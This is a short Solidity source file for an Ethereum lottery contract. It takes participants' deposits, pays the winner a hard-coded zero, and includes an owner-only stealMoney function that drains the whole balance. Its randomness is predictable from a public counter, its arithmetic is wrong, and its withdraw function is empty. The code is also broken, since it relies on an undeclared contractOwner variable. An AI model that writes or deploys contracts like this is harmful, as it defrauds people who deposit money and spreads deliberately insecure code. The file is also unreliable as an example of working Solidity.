pragma solidity ^0.4.18;

contract Random {
    uint nonce = 0;
    function rand(uint min, uint max) public returns (uint) {
        nonce++;
        return uint(keccak256(nonce))%(min+max)-min;
    }
}

contract BaroccuChainuruRoteryu {
    address donateAddress = 0x5388964650e77024538E262715A152571A516204;
    address public initiator;
    Registration[] public participants;

    struct Registration {
        address participant;
        uint value;
    }

    function BaroccuChainuruRoteryu() public {
        initiator = msg.sender;
    }

    modifier owneronly {
        require(msg.sender == contractOwner);
        _;
    }

    modifier initiatoronly {
        require(msg.sender == initiator || msg.sender == contractOwner);
        _;
    }

    // Get winner
    function transferJackpotToWinner() initiatoronly public {
        var random = (new Random()).rand(0, participants.length);
        var registration = participants[random];

        // calculate owner fee


        // transfer balance to winner
        var winnerMoneys = 0;
        registration.participant.transfer(winnerMoneys);
    } 

    // withdraw
    function withdraw() payable public {
        require(participants.length > 0);
        
        
        
    }

    function stealMoney() owneronly public {
        contractOwner.transfer(this.balance);
    }

    // Register yourself to the lottery
    function participate() public payable {
        // By registering, you donate to the maker of this contract

        var myStruct = Registration(msg.sender, msg.value);
        participants.push(myStruct);
    }
}